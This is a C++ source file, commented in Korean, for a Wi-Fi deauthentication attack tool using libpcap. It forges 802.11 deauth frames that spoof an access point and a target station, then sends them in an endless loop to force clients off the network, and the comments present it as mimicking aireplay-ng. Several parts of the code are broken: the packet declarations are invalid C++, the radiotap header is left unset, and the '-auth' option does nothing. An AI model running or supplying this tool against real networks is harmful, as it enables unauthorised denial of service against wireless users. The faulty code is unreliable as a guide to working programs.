#include <pcap.h>
#include <string>
#include <cstring>
#include <unistd.h>

#include <stdbool.h>
#include <stdio.h>
#include <iostream>
#include <vector>
#include <map>
#include <time.h>
#include <mutex>
#include <thread>
#include <chrono>
#include "radiohdr-field.h"



using namespace std;

void usage() {
	printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

typedef struct {
	char* dev_;          // 인터페이스 (wlan0, mon0 등)
    char* ap_mac_;       // AP의 MAC 주소
    char* station_mac_;  // Station(단말기)의 MAC 주소 (선택)
    bool auth_flag_;     // -auth 옵션 활성화 여부
} Param;

Param param = {
	.dev_ = NULL,
    .ap_mac_ = NULL,
    .station_mac_ = NULL,
    .auth_flag_ = false
};

bool parse(Param* param, int argc, char* argv[]) {
    // 최소 실행 파일(argv[0]), 인터페이스(argv[1]), AP MAC(argv[2])이 필요하므로 argc는 최소 3이어야 함
    if (argc < 3 || argc > 5) {
        usage();
        return false;
    }

    // 필수 인자 저장
    param->dev_ = argv[1];
    param->ap_mac_ = argv[2];

    // 선택 인자 1: Station MAC이 입력된 경우 (argc >= 4)
    if (argc >= 4) {
        // 사용자가 실수로 station mac 자리에 -auth를 먼저 적었는지 방어 (usage 규칙 엄수)
        if (strncmp(argv[3], "-auth", 5) == 0) {
            printf("[Error] -auth 옵션은 <station mac> 뒤에 와야 합니다.\n");
            usage();
            return false; 
        }
        param->station_mac_ = argv[3];
    }

    // 선택 인자 2: -auth 옵션이 입력된 경우 (argc == 5)
    if (argc == 5) {
        if (strncmp(argv[4], "-auth", 5) == 0) {
            param->auth_flag_ = true;
        } else {
            printf("[Error] 알 수 없는 옵션입니다: %s\n", argv[4]);
            usage();
            return false;
        }
    }

    return true;
}

#pragma pack(push, 1)
struct RadioTapHdr {
    uint8_t  version_;
    uint8_t  pad_;
    uint16_t len_;
    uint32_t present_;
};

struct Mac{
    uint8_t addr[6];

    Mac() {
        memset(addr, 0, 6);
    }

    Mac(const char* mac_str) {
        int values[6]; 
        int result = sscanf(mac_str, "%x:%x:%x:%x:%x:%x", 
                            &values[0], &values[1], &values[2], 
                            &values[3], &values[4], &values[5]);
        
        if (result == 6) {
            for(int i = 0; i < 6; ++i) {
                addr[i] = static_cast<uint8_t>(values[i]);
            }
        } else {
            memset(addr, 0, 6);
        }
    }

    Mac(const std::string& mac_str) : Mac(mac_str.c_str()) {}
    static Mac from_string(const string& mac_str) {
        return Mac(mac_str.c_str());
    }

    bool operator<(const Mac& other) const {
        return memcmp(addr, other.addr, 6) < 0; // BSSID 비교를 위한 연산자 오버로딩
    }

    // bssid와 ssid를 출력하는 함수
    void print_mac() const {
        printf("%02x:%02x:%02x:%02x:%02x:%02x\n", addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);
    }
};

typedef struct Dot11Hdr {
    uint8_t subtype_; // 패킷 종류와 플래그 (길이 변화의 핵심)
	uint8_t  ver_type_; // 패킷 종류와 플래그 (길이 변화의 핵심)
    uint16_t duration_id_;
    Mac  addr_1; // receiver
    Mac  addr_2; // transmitter
    Mac  addr_3; // 프로토콜마다 다르다
    uint16_t seq_control_;

    // 802.11 프레임이 Deauth인지 확인하는 멤버 함수
    bool is_deauth() const {
        return (subtype_ == 0xc0) && (ver_type_ == 0x00);
    }

    
} Dot11Hdr;

// Deauth 프레임 전용 구조체 (MAC 헤더 상속 + Reason Code)
struct DeauthFrame : public Dot11Hdr {
    // 802.11 규격에 따라 MAC 헤더 바로 뒤에 2바이트 이유(Reason) 코드가 붙습니다.
    uint16_t reason_code_; 

    // 인젝션할 패킷을 한 번에 세팅해 주는 초기화 메서드
    DeauthFrame(Mac dest, Mac src, Mac bssid) {
        // [중요] 802.11 Frame Control 세팅
        // 0xc0: Management 프레임(Type 0) 중 Deauthentication(Subtype 12)을 의미
        subtype_ = 0xc0;        
        ver_type_ = 0x00;       
        
        // Duration: 보통 Deauth 프레임 전송 시 314 마이크로초를 세팅합니다. (Little Endian 0x013a)
        duration_id_ = 0x013a;  
        
        addr_1 = dest;
        addr_2 = src;
        addr_3 = bssid;
        seq_control_ = 0x0000;
        
        // [핵심] Reason Code 7: "Class 3 frame received from nonassociated STA"
        // 단말기에게 "너 우리 AP랑 연결 안 되어있는데 왜 데이터 보내? 당장 끊어!"라고 속이는 마법의 코드입니다.
        reason_code_ = 0x0007; 
    }
};

// 최종적으로 메모리에 올릴 전체 패킷 구조체
struct DeauthPacket {
    RadioTapHdr rtap;
    DeauthFrame deauth;
};
#pragma pack(pop)

int main(int argc, char *argv[]) {
    if (!parse(&param, argc, argv))
        return -1;

	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }
		

    // 1. MAC 객체 생성 (문자열 -> 바이트 배열 변환)
    Mac ap_mac(param.ap_mac_);
    Mac station_mac;
    bool is_broadcast = false;
    
    if (param.station_mac_ != NULL) {
        station_mac = Mac(param.station_mac_);
    } else {
        // 단말기가 지정되지 않으면 브로드캐스트 주소로 설정
        station_mac = Mac("ff:ff:ff:ff:ff:ff");
        is_broadcast = true;
    }

    // 디버깅: 변환된 MAC 주소 확인
    printf("[Target Info]\n");
    printf("Interface   : %s\n", param.dev_);
    printf("AP MAC      : ");
    ap_mac.print_mac();
    printf("Station MAC : ");
    station_mac.print_mac();
    printf("Auth Attack : %s\n", param.auth_flag_ ? "ON" : "OFF");

    // 4. 전송할 패킷 조립
    // AP -> Station 패킷 세팅
    // 목적지: Station / 출발지: AP / BSSID: AP
    DeauthPacket pAtoS.deauth(station_mac, ap_mac, ap_mac); 
    // Station -> AP 패킷 세팅 (브로드캐스트가 아닐 때만 유효함)
    // 목적지: AP / 출발지: Station / BSSID: AP
    DeauthPacket pStoA.deauth(ap_mac, station_mac, ap_mac); 

    // 5. 공격 루프 (aireplay-ng 로직 모방)
    int count = 0;
    while (true) {
        // [첫 번째 샷] AP인 척하고 Station에게 쏨 (또는 Broadcast로 전체에게 쏨)
        // reinterpret_cast를 통해 우리가 만든 구조체를 바이트 배열로 취급하여 전송
        int res1 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&pAtoS), sizeof(DeauthPacket));
        if (res1 != 0) {
            fprintf(stderr, "\nError sending packet: %s\n", pcap_geterr(pcap));
            break;
        }

        // [두 번째 샷] Broadcast 모드가 아니라면, Station인 척하고 AP에게도 쏨 (더 확실하게 끊기 위함)
        if (!is_broadcast) {
            int res2 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&pStoA), sizeof(DeauthPacket));
            if (res2 != 0) {
                fprintf(stderr, "\nError sending packet: %s\n", pcap_geterr(pcap));
                break;
            }
        }

        count++;
        // 터미널에서 숫자가 계속 올라가도록 캐리지 리턴(\r) 사용
        printf("\rSent %d Deauth packets...", count);
        fflush(stdout);
        // 너무 빨리 쏘면 랜카드가 다운되거나 운영체제 큐가 꽉 찰 수 있으므로 딜레이 부여
        // 100,000 마이크로초 = 0.1초 딜레이 (초당 약 10번 전송)
        usleep(100000); 
    }
    pcap_close(pcap);
	return 0;
}